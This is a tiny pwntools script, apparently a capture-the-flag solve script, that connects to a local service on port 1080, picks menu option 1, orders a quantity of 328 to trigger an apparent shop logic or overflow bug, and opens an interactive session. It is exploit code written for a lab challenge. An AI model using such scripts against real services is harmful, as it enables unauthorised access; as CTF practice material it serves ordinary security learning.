from pwn import *

p = remote("127.0.0.1", 1080)

payload = b'1 \n'
p.sendafter("choice: ",payload)

payload = b'328\n'
p.sendafter("to buy: ",payload)

p.interactive()
